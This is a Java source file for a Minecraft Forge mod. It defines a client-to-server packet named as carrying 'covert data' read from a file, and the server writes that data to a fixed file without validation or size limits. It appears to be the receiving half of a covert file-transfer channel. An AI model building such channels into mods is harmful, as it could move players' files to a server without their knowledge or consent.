package com.example.covertmod.networking.packets;

import com.mojang.logging.LogUtils;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraftforge.event.network.CustomPayloadEvent;
import org.slf4j.Logger;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

/**
 * This class represents a packet that contains covert data sent from the client to the server.
 */
public class CovertDataC2SPacket {
    // The data read from the file
    private final String fileData;
    // Logger instance for logging events
    private static final Logger LOGGER = LogUtils.getLogger();
    // Filename for the server-side file
    private static final String FILENAME = "server-side-file.txt";

    /**
     * Constructs a new CovertDataC2SPacket with the specified file data.
     *
     * @param fileData the data read from the file
     */
    public CovertDataC2SPacket(String fileData) {
        this.fileData = fileData;
    }

    /**
     * Constructs a new CovertDataC2SPacket by reading data from the provided buffer.
     *
     * @param buf the buffer containing the packet data
     */
    public CovertDataC2SPacket(FriendlyByteBuf buf) {
        this.fileData = buf.readUtf();
    }

    /**
     * Writes the packet data to the provided buffer.
     *
     * @param buf the buffer to write the packet data to
     */
    public void toBytes(FriendlyByteBuf buf) {
        buf.writeUtf(this.fileData);
    }

    /**
     * Handles the packet when it is received on the server.
     *
     * @param context the context of the custom payload event
     */
    public void handle(CustomPayloadEvent.Context context) {
        context.enqueueWork(() -> {
            ServerPlayer player = context.getSender();
            if (player != null) {
                // Send a system message to the player with the number of bytes read
                player.sendSystemMessage(Component.translatable("Bytes read: " + this.fileData.length()));
                // Write the file data to a server-side file
                writeFileData(this.fileData);
            }
        });
    }

    /**
     * Writes the provided data to a file on the server.
     *
     * @param data the data to write to the file
     */
    private void writeFileData(String data) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(FILENAME, false))) {
            writer.write(data);
            LOGGER.info("Wrote {} bytes to file", data.length());
        } catch (IOException e) {
            LOGGER.error("Error writing data to file: {}", e.getMessage());
        }
    }
}